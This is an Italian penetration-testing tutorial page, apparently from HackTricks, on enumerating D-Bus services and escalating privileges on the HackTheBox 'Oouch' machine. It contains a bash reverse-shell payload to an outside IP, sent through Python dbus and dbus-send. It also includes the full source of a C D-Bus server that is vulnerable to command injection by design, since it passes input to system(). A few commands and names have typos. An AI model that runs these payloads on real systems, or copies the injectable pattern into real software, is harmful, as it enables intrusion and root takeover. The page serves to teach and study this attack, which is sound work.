# Enumerazione di D-Bus e Privilege Escalation tramite Command Injection

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

## **Enumerazione GUI**

D-Bus viene utilizzato come mediatore delle comunicazioni inter-processo (IPC) negli ambienti desktop di Ubuntu. Su Ubuntu, si osserva l'operazione concorrente di diversi bus di messaggi: il bus di sistema, utilizzato principalmente dai **servizi privilegiati per esporre servizi rilevanti per l'intero sistema**, e un bus di sessione per ogni utente connesso, che espone servizi rilevanti solo per quel particolare utente. L'attenzione qui è principalmente sul bus di sistema a causa della sua associazione con servizi in esecuzione con privilegi più elevati (ad esempio, root), poiché il nostro obiettivo è elevare i privilegi. Si nota che l'architettura di D-Bus utilizza un "router" per ogni bus di sessione, che è responsabile per reindirizzare i messaggi dei client ai servizi appropriati in base all'indirizzo specificato dai client per il servizio con cui desiderano comunicare.

I servizi su D-Bus sono definiti dagli **oggetti** e dalle **interfacce** che espongono. Gli oggetti possono essere paragonati alle istanze di classe nei linguaggi di programmazione orientati agli oggetti standard, con ogni istanza identificata in modo univoco da un **percorso dell'oggetto**. Questo percorso, simile a un percorso del file system, identifica in modo univoco ogni oggetto esposto dal servizio. Un'interfaccia chiave per scopi di ricerca è l'interfaccia **org.freedesktop.DBus.Introspectable**, che presenta un singolo metodo, Introspect. Questo metodo restituisce una rappresentazione XML dei metodi supportati dall'oggetto, dei segnali e delle proprietà, con un focus qui sui metodi, tralasciando le proprietà e i segnali.

Per la comunicazione con l'interfaccia D-Bus, sono stati utilizzati due strumenti: uno strumento CLI chiamato **gdbus** per l'invocazione facile dei metodi esposti da D-Bus negli script, e [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), uno strumento GUI basato su Python progettato per enumerare i servizi disponibili su ogni bus e per visualizzare gli oggetti contenuti in ciascun servizio.
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)


Nella prima immagine vengono mostrati i servizi registrati con il bus di sistema D-Bus, con **org.debin.apt** specificamente evidenziato dopo aver selezionato il pulsante Bus di sistema. D-Feet interroga questo servizio per gli oggetti, mostrando interfacce, metodi, proprietà e segnali per gli oggetti scelti, come si può vedere nella seconda immagine. Viene anche fornita una descrizione dettagliata della firma di ogni metodo.

Una caratteristica notevole è la visualizzazione dell'**ID del processo (pid)** e della **riga di comando** del servizio, utile per confermare se il servizio viene eseguito con privilegi elevati, importante per la rilevanza della ricerca.

**D-Feet consente anche l'invocazione di metodi**: gli utenti possono inserire espressioni Python come parametri, che D-Feet converte in tipi D-Bus prima di passarli al servizio.

Tuttavia, si noti che **alcuni metodi richiedono l'autenticazione** prima di consentirci di invocarli. Ignoreremo questi metodi, poiché il nostro obiettivo è elevare i nostri privilegi senza credenziali in primo luogo.

Si noti inoltre che alcuni dei servizi interrogano un altro servizio D-Bus chiamato org.freedeskto.PolicyKit1 per verificare se un utente deve essere autorizzato o meno a eseguire determinate azioni.

## **Enumerazione della riga di comando**

### Elenco degli oggetti di servizio

È possibile elencare le interfacce D-Bus aperte con:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### Connessioni

[Da Wikipedia:](https://it.wikipedia.org/wiki/D-Bus) Quando un processo stabilisce una connessione a un bus, il bus assegna alla connessione un nome speciale chiamato _nome di connessione univoco_. I nomi di bus di questo tipo sono immutabili, il che significa che non cambieranno finché la connessione esiste, e, cosa più importante, non possono essere riutilizzati durante la durata del bus. Ciò significa che nessun'altra connessione a quel bus avrà mai assegnato un nome di connessione univoco, anche se lo stesso processo chiude la connessione al bus e ne crea una nuova. I nomi di connessione univoci sono facilmente riconoscibili perché iniziano con il carattere due punti, altrimenti vietato.

### Informazioni sull'oggetto del servizio

Successivamente, è possibile ottenere alcune informazioni sull'interfaccia con:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### Elencare le interfacce di un oggetto di servizio

È necessario disporre di sufficienti autorizzazioni.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspezione dell'interfaccia di un oggetto di servizio

Nota come in questo esempio è stata selezionata l'ultima interfaccia scoperta utilizzando il parametro `tree` (_vedi sezione precedente_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Nota il metodo `.Block` dell'interfaccia `htb.oouch.Block` (quello che ci interessa). La "s" delle altre colonne potrebbe significare che si aspetta una stringa.

### Monitorare/Interfaccia di cattura

Con sufficienti privilegi (solo i privilegi `send_destination` e `receive_sender` non sono sufficienti) è possibile **monitorare una comunicazione D-Bus**.

Per **monitorare** una **comunicazione** sarà necessario essere **root**. Se si riscontrano ancora problemi nel diventare root, controllare [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) e [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

{% hint style="warning" %}
Se sai come configurare un file di configurazione D-Bus per **consentire agli utenti non root di sniffare** la comunicazione, **contattami**!
{% endhint %}

Diverse modalità di monitoraggio:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Nell'esempio seguente viene monitorata l'interfaccia `htb.oouch.Block` e viene inviato il messaggio "**_**lalalalal**_**" attraverso una comunicazione errata**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Puoi utilizzare `capture` invece di `monitor` per salvare i risultati in un file pcap.

#### Filtrare tutto il rumore <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Se ci sono troppe informazioni sul bus, puoi passare una regola di corrispondenza in questo modo:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Possono essere specificate più regole. Se un messaggio corrisponde a _qualsiasi_ delle regole, il messaggio verrà stampato. Come segue:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Vedi la [documentazione di D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) per ulteriori informazioni sulla sintassi delle regole di corrispondenza.

### Altro

`busctl` ha ancora più opzioni, [**trovale tutte qui**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Scenario Vulnerabile**

Come utente **qtc all'interno dell'host "oouch" da HTB**, puoi trovare un **file di configurazione D-Bus inaspettato** situato in _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Nota dalla configurazione precedente che **dovrai essere l'utente `root` o `www-data` per inviare e ricevere informazioni** tramite questa comunicazione D-BUS.

Come utente **qtc** all'interno del contenitore Docker **aeb4525789d8**, puoi trovare del codice relativo a dbus nel file _/code/oouch/routes.py._ Questo è il codice interessante:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Come puoi vedere, si sta **connettendo a un'interfaccia D-Bus** e inviando alla funzione **"Block"** l'indirizzo IP del client.

Dall'altra parte della connessione D-Bus c'è un binario compilato in C in esecuzione. Questo codice sta **ascoltando** sulla connessione D-Bus **per gli indirizzi IP e sta chiamando iptables tramite la funzione `system`** per bloccare l'indirizzo IP fornito.\
**La chiamata a `system` è vulnerabile appositamente all'iniezione di comandi**, quindi un payload come il seguente creerà una shell inversa: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Sfruttare la vulnerabilità

Alla fine di questa pagina puoi trovare il **codice C completo dell'applicazione D-Bus**. All'interno puoi trovare tra le righe 91-97 come vengono **registrati il `percorso dell'oggetto D-Bus`** e il **`nome dell'interfaccia`**. Queste informazioni saranno necessarie per inviare informazioni alla connessione D-Bus:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Inoltre, nella riga 57 puoi trovare che **l'unico metodo registrato** per questa comunicazione D-Bus si chiama `Block` (_**Ecco perché nella sezione successiva i payload verranno inviati all'oggetto di servizio `htb.oouch.Block`, all'interfaccia `/htb/oouch/Block` e al nome del metodo `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Il seguente codice python invierà il payload alla connessione D-Bus al metodo `Block` tramite `block_iface.Block(runme)` (_nota che è stato estratto dal precedente blocco di codice_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl e dbus-send

`busctl` is a command-line tool used to interact with the D-Bus system bus. It allows you to list available services, objects, and interfaces, as well as call methods and inspect properties.

`dbus-send` is another command-line tool that can be used to send messages to a D-Bus message bus. It can be used to invoke methods on remote objects, as well as to set and get properties.

Both `busctl` and `dbus-send` are powerful tools that can be used for enumeration and command injection during privilege escalation attacks. By leveraging these tools, an attacker can gather information about the system and potentially execute arbitrary commands with elevated privileges.
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* `dbus-send` è uno strumento utilizzato per inviare messaggi al "Message Bus"
* Message Bus - Un software utilizzato dai sistemi per facilitare le comunicazioni tra le applicazioni. È correlato a Message Queue (i messaggi sono ordinati in sequenza), ma nel Message Bus i messaggi vengono inviati in un modello di sottoscrizione e sono anche molto veloci.
* Il tag "-system" viene utilizzato per indicare che si tratta di un messaggio di sistema, non di un messaggio di sessione (per impostazione predefinita).
* Il tag "--print-reply" viene utilizzato per stampare il nostro messaggio in modo appropriato e ricevere eventuali risposte in un formato leggibile dall'essere umano.
* "--dest=Dbus-Interface-Block" è l'indirizzo dell'interfaccia Dbus.
* "--string:" - Tipo di messaggio che desideriamo inviare all'interfaccia. Ci sono diversi formati per l'invio di messaggi come double, bytes, booleans, int, objpath. Tra questi, "object path" è utile quando vogliamo inviare il percorso di un file all'interfaccia Dbus. In questo caso possiamo utilizzare un file speciale (FIFO) per passare un comando all'interfaccia con il nome di un file. "string:;" - Questo serve per richiamare nuovamente il percorso dell'oggetto in cui inseriamo il file di shell inversa FIFO.
 
_Nota che in `htb.oouch.Block.Block`, la prima parte (`htb.oouch.Block`) fa riferimento all'oggetto del servizio e l'ultima parte (`.Block`) fa riferimento al nome del metodo._

### Codice C

{% code title="d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

## Riferimenti
* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
